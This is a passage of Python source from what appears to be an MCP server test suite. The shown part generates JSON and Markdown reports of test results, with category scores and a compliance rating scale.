                    "failed": len(cat_results) - passed_count
                }
        
        total_tests = len(self.results)
        total_passed = sum(1 for r in self.results if r.passed)
        overall_score = statistics.mean([r.score for r in self.results]) if self.results else 0
        
        # JSON detailed report
        report_data = {
            "timestamp": timestamp,
            "workspace": self.WORKSPACE,
            "server_info": self.server_info,
            "summary": {
                "total_tests": total_tests,
                "passed": total_passed,
                "failed": total_tests - total_passed,
                "overall_score": overall_score,
                "pass_rate": total_passed / total_tests if total_tests > 0 else 0
            },
            "category_scores": category_scores,
            "results": [asdict(r) for r in self.results]
        }
        
        json_file = self.OUTPUT_DIR / f"detailed_report_{timestamp}.json"
        with open(json_file, "w") as f:
            json.dump(report_data, f, indent=2, default=str)
        
        # Markdown summary report
        md_content = f"""# MCP Comprehensive Test Report

**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  
**Workspace:** `{self.WORKSPACE}`  
**Server:** {self.server_info.get('name', 'Unknown')} {self.server_info.get('version', '')}

## Executive Summary

| Metric | Value |
|--------|-------|
| **Overall Score** | {overall_score*100:.1f}% |
| **Total Tests** | {total_tests} |
| **Passed** | {total_passed} ✓ |
| **Failed** | {total_tests - total_passed} ✗ |
| **Pass Rate** | {total_passed/total_tests*100:.1f}% |

## Category Scores

| Category | Score | Tests | Passed | Failed |
|----------|-------|-------|--------|--------|
"""
        
        for cat_name, scores in category_scores.items():
            md_content += f"| {cat_name} | {scores['average_score']*100:.0f}% | {scores['total_tests']} | {scores['passed']} | {scores['failed']} |\n"
        
        md_content += "\n## Detailed Results\n\n"
        
        current_category = None
        for result in self.results:
            if result.category != current_category:
                current_category = result.category
                md_content += f"\n### {current_category}\n\n"
            
            status_icon = "✅" if result.passed else "❌"
            md_content += f"**{status_icon} {result.test_name}** (Score: {result.score*100:.0f}%)\n"
            md_content += f"- Duration: {result.duration_ms:.0f}ms\n"
            
            if result.details:
                md_content += f"- Details: `{json.dumps(result.details, default=str)[:200]}...`\n"
            
            if result.error_message:
                md_content += f"- Error: `{result.error_message}`\n"
            
            md_content += "\n"
        
        md_content += f"""\n## MCP Compliance Rating

Based on the test results, this MCP server achieves a **{overall_score*100:.0f}%** compliance score.

### Rating Scale:
- **95-100%**: Excellent - Full MCP compliance
- **85-94%**: Good - Minor issues, production ready
- **70-84%**: Fair - Some gaps, review recommended
- **50-69%**: Poor - Significant issues, not recommended
- **Below 50%**: Critical - Major compliance failures

### Recommendation
"""
        
        if overall_score >= 0.95:
            md_content += "✨ **Excellent** - This MCP server demonstrates full compliance with MCP standards."
        elif overall_score >= 0.85:
            md_content += "✓ **Good** - This MCP server is production-ready with minor areas for improvement."
        elif overall_score >= 0.70:
            md_content += "⚠ **Fair** - This MCP server has some compliance gaps. Review failed tests."
        elif overall_score >= 0.50:
            md_content += "❌ **Poor** - This MCP server has significant issues. Not recommended for production."
        else:
            md_content += "🚨 **Critical** - This MCP server has major compliance failures. Requires immediate attention."
        
        md_file = self.OUTPUT_DIR / f"evaluation_summary_{timestamp}.md"
        with open(md_file, "w") as f:
            f.write(md_content)
        
        # Print summary to console
        print("\n" + "=" * 70)
        print("TEST COMPLETE")
        print("=" * 70)
        print(f"Overall Score: {overall_score*100:.1f}%")
        print(f"Passed: {total_passed}/{total_tests}")
        print(f"\nReports saved:")
        print(f"  - {json_file}")
        print(f"  - {md_file}")
        print("=" * 70)


if __name__ == "__main__":
    suite = MCPTestSuite()
    suite.run_all_tests()
